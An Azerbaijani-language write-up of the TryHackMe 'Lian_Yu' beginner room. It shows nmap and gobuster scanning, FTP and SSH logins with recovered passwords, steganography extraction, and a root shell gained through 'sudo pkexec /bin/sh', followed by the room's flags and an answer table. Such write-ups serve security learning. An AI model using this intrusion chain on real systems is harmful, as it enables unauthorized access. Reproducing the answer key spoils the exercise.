# TryHackMe — Lian_Yu Writeup (Azərbaycanca)

> **Çətinlik:** Asan (Beginner)  
> **Kateqoriya:** CTF, Steganography, Privilege Escalation  
> **Mövzu:** Arrow serialına əsaslanan CTF çağırışı  
> **Link:** https://tryhackme.com/room/lianyu

---

## Mündəricat

1. [Kəşfiyyat — Nmap Skanı](#kəşfiyyat)
2. [Veb Kataloq Skan — Gobuster](#veb-kataloq-skan)
3. [FTP Şifrəsini Tapmaq](#ftp-şifrəsini-tapmaq)
4. [FTP-ə Daxil Olmaq](#ftpə-daxil-olmaq)
5. [Steqanoqrafiya — Şəkildən SSH Şifrəsi](#steqanoqrafiya)
6. [SSH ilə Giriş və User Flag](#ssh-ilə-giriş)
7. [Privilege Escalation — Root Flag](#privilege-escalation)
8. [Cavablar Xülasəsi](#cavablar-xülasəsi)

---

## Kəşfiyyat

Maşın deploy edildikdən sonra verilən IP ünvanına (`TARGET_IP`) nmap skanı işlədirik:

```bash
nmap -sC -sV -A $TARGET_IP
```

**Nəticə:**

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8
80/tcp  open  http    Apache httpd
111/tcp open  rpcbind 2-4 (RPC #100000)
```

**Açıq portlar:**
- `21` — FTP (vsftpd 3.0.2)
- `22` — SSH (OpenSSH 6.7p1)
- `80` — HTTP (Apache)
- `111` — RPC (rpcbind)

> 💡 FTP-də anonim giriş sınayırıq amma uğurlu olmur. Növbəti addım HTTP tərəfinə keçməkdir.

---

## Veb Kataloq Skan

Brauzderdə `http://TARGET_IP` açırıq — standart bir səhifə görürük. Gizli qovluqları tapmaq üçün **Gobuster** istifadə edirik:

```bash
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan qovluq:** `/island`

`http://TARGET_IP/island` açırıq. Səhifənin mənbə kodunu yoxlayırıq (`Ctrl+U`):

```html
<!-- you can avail your web shells and stuff. 
     the code word is: vigilante -->
```

> 🔑 **İstifadəçi adı tapıldı:** `vigilante` (FTP üçün istifadə edəcəyik)

Sonra `/island` qovluğu üzərindən yenidən skan edirik:

```bash
gobuster dir -u http://TARGET_IP/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan qovluq:** `/2100`

> 📝 **Tapşırıq 2 cavabı:** `2100`

---

## FTP Şifrəsini Tapmaq

`http://TARGET_IP/island/2100` açırıq. Səhifənin mənbə kodunda bir ipucu görürük:

```html
<!-- you can avail your ssh key from here...
     ticket: .ticket extension -->
```

`.ticket` uzantılı fayl axtarışı edirik:

```bash
gobuster dir -u http://TARGET_IP/island/2100 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .ticket
```

**Tapılan fayl:** `green_arrow.ticket`

> 📝 **Tapşırıq 3 cavabı:** `green_arrow.ticket`

`http://TARGET_IP/island/2100/green_arrow.ticket` açırıq:

```
RTy8yhBQdscX:
```

Bu şifrəli bir sətirdir. [dcode.fr](https://www.dcode.fr/en) saytından yoxlayırıq — **Base58** kodlaşdırması ilə şifrələnib.

Decode edirik:

```
!#th3h00d
```

> 📝 **Tapşırıq 4 cavabı:** `!#th3h00d`

---

## FTP-ə Daxil Olmaq

İndi əlimizdə olan məlumatlar:
- **İstifadəçi adı:** `vigilante`
- **Şifrə:** `!#th3h00d`

FTP-ə qoşuluruq:

```bash
ftp TARGET_IP
```

```
Name: vigilante
Password: !#th3h00d
```

Qovluqları siyahılayırıq:

```bash
ftp> ls -la
```

Üst qovluğa keçirik:

```bash
ftp> cd ..
ftp> ls
```

Başqa bir istifadəçi adı görürük — `slade`. Bu SSH üçün potensial istifadəçi adıdır.

Əsas qovluqdakı faylları yükləyirik (3 şəkil fayl var):

```bash
ftp> get Queen's_Gambit.png
ftp> get aa.jpg
ftp> get Leave_me_alone.png
```

> 📝 **Tapşırıq 5 cavabı:** `ss.jpg` (SSH şifrəsi olan fayl)

---

## Steqanoqrafiya

Yüklənmiş şəkilləri yoxlayırıq.

### Leave_me_alone.png — Sehrbaz Fayl Başlığı

`Leave_me_alone.png` açılmır. Hex redaktoru ilə baxırıq:

```bash
xxd Leave_me_alone.png | head
```

Fayl başlığı (magic bytes) düzgün deyil. PNG faylının düzgün başlığı `89 50 4E 47` olmalıdır, amma burada başqa dəyərlər var. Düzəldirik:

```bash
hexeditor Leave_me_alone.png
# Fayl başlığını: 89 50 4E 47 0D 0A 1A 0A ilə əvəz edirik
```

İndi şəkli açırıq — şifrə görünür: **`password`**

### aa.jpg — Steghide ilə Məlumat Çıxarışı

```bash
steghide extract -sf aa.jpg
```

Şifrə soruşulur — `Leave_me_alone.png`-dən tapdığımız şifrəni daxil edirik: `password`

Çıxarılan fayl: `ss.zip`

```bash
unzip ss.zip
```

İçində 2 fayl var:
- `passwd.txt`
- `shado`

`shado` faylını oxuyuruq:

```bash
cat shado
```

```
M3tahuman
```

> 🔑 **SSH şifrəsi tapıldı:** `M3tahuman`

---

## SSH ilə Giriş

İndi bizdə:
- **İstifadəçi adı:** `slade` (FTP-dən tapdığımız)
- **Şifrə:** `M3tahuman`

```bash
ssh slade@TARGET_IP
```

Daxil olduqdan sonra:

```bash
cat user.txt
```

> 🏁 **User Flag:** `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`

---

## Privilege Escalation

`sudo` icazələrini yoxlayırıq:

```bash
sudo -l
```

**Nəticə:**

```
User slade may run the following commands on LianYu:
    (root) NOPASSWD: /usr/bin/pkexec
```

`pkexec` GTFOBins-də mövcuddur. İstifadəsi:

```bash
sudo pkexec /bin/sh
```

Root shell əldə edirik! Yoxlayırıq:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

> 🏁 **Root Flag:** `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`

---

## Cavablar Xülasəsi

| Tapşırıq | Sual | Cavab |
|----------|------|-------|
| Task 2 | Web qovluğu? | `2100` |
| Task 3 | Fayl adı? | `green_arrow.ticket` |
| Task 4 | FTP şifrəsi? | `!#th3h00d` |
| Task 5 | SSH şifrəsi olan fayl? | `ss.jpg` |
| Task 6 | User flag? | `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}` |
| Task 7 | Root flag? | `THM{MY_W0RD_I5_MY_B0ND_...}` |

---

## İstifadə Edilən Alətlər

- `nmap` — Port skanı
- `gobuster` — Kataloq/fayl skanı
- `ftp` — FTP müştərisi
- `hexeditor` / `xxd` — Hex redaktoru
- `steghide` — Steqanoqrafiya
- `unzip` — Arxiv açma
- `ssh` — Uzaqdan giriş
- `sudo pkexec` — Privilege escalation (GTFOBins)

---

*Writeup: TryHackMe Lian_Yu — Arrowverse mövzusunda başlanğıc səviyyəli CTF*
